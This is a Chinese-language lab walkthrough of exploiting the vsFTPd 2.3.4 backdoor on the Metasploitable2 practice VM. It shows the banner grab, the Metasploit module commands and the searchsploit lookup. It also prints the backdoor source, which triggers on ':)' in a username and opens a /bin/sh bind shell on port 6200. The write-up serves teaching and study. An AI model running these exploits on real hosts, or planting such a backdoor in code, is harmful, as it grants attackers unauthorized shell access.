## 渗透FTP服务
0、需要的工具
- telnet
- google，百度等搜索引擎
- metasploit3
- exploit-db
- `find` and `grep`

1、前面`namp -p 0-65535 metasploitable2`的时候有ftp服务。

2、使用telnet工具拿到ftp服务的名字和版本号。
```bash
[root@kali: ~#] telnet metasploitable2 21
Trying 192.168.199.169...
Connected to metasploitable2.
Escape character is '^]'.
220 (vsFTPd 2.3.4)

```  
3、也可以直接去查看metasploitable2上的ftpd服务的名字和版本

4、得到软件名字和版本号，就动用google，百度等搜索引擎，开始找相关的漏洞，
在网上已经有这个版本被人植入后门消息，查看一下，还得到了metasploit的利用，
```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
#查看options和payloads
msf > show options
msf > show payloads
#最后确认只需要设置RHOST
msf > set RHOST metasploitable2
msf > exploit
#果断的拿到了shell
```
5、vsFTPd 后门代码片段
- str.c
```C
int
str_contains_space(const struct mystr* p_str)
{
  unsigned int i;
  for (i=0; i < p_str->len; i++)
  {
    if (vsf_sysutil_isspace(p_str->p_buf[i]))
    {
      return 1;
    }
    else if((p_str->p_buf[i]==0x3a) // 对应的字符是`:`
    && (p_str->p_buf[i+1]==0x29))   //对应的字符是`)`
    {
      vsf_sysutil_extra();
    }
  }
  return 0;
}
```
- sysdeputil.c
```C
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1); 
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200); 
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa, //会监听一个6200的端口
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  { 
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0); //得到shell
  } 
}
```
6、[vsftpd下载地址](http://ftp.gwdg.de/pub/cert.dfn/tools/net/vsftpd/)

7、我查看源代码方式
```bash
[root@kali: ~#] cd vsftpd
#直接找linux的bin目录
[root@kali: ~#] find . -name "*.c" | xargs grep "/bin"

```
ps: 我得到exploit的方式是通过exploit-db,最开始并不是按早上面的步骤来的。
```bash
[root@kali: ~#] searchsploit vsftp
#在这里找到VSFTPD 2.3.4的一个ruby脚本17491.rb
[root@kali: ~#] locate 17491.rb
/usr/share/exploitdb/platforms/unix/remote/17491.rb
#得到17491.rb的绝对路径,查看这个脚本
[root@kali: ~#] cat /usr/share/exploitdb/platforms/unix/remote/17491.rb
#注释里面已经告诉你了。。。:)

```